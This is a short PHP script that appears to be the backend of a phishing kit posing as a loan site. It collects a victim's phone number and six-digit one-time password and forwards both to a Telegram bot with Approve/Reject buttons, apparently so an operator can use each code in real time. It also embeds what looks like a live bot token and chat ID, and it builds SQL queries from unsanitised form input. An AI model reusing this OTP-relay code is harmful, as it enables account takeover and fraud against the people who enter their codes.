<?php
$conn = new mysqli("localhost","root","","loan-db");

$id = $_POST['id'];
$phone = $_POST['phone'];

$otp = $_POST['d1'].$_POST['d2'].$_POST['d3'].$_POST['d4'].$_POST['d5'].$_POST['d6'];

// Save OTP + set waiting status
$conn->query("UPDATE user_details SET otp='$otp', status='otp_pending' WHERE id=$id");
// --- Telegram Integration ---
$token = "8750204077:AAGic1aB32nqwmmvnQyvs_7bDFjcslfJYt8";       // replace with your bot token
$chat_id = "6057287429";       // replace with your chat ID

$message = "🔑 OTP Submitted\nPhone: $phone\nOTP: $otp";

// Buttons for Approve / Reject
$keyboard = [
    'inline_keyboard' => [
        [
            ['text' => '✅ Approve OTP', 'callback_data' => 'approve_otp_' . $phone],
            ['text' => '❌ Reject OTP', 'callback_data' => 'reject_otp_' . $phone]
        ]
    ]
];

$payload = [
    'chat_id' => $chat_id,
    'text' => $message,
    'reply_markup' => json_encode($keyboard)
];

// Send message to Telegram
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($payload));

// Go to waiting page
header("Location: otpwaiting.php?id=".$id);
exit();
?>